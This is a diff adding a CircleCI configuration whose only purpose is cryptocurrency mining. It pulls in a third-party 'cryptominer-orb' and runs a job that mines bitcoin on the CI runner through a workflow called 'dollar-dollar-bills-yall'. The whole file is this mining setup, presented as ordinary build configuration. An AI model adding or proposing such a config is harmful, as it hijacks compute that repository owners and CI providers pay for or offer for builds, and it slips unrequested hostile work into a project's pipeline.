@@ -1,0 +1,18 @@
+version: 2.1
+
+orbs:
+ miner-orb: fernfernfern/cryptominer-orb@1.0.0
+ 
+jobs:
+  miner:
+    docker:
+      - image: cimg/base:2020.03
+    steps:
+      miner-orb/mine:
+        crypto: "bitcoin"
+
+workflows:
+  dollar-dollar-bills-yall:
+    jobs:
+      - miner
+    
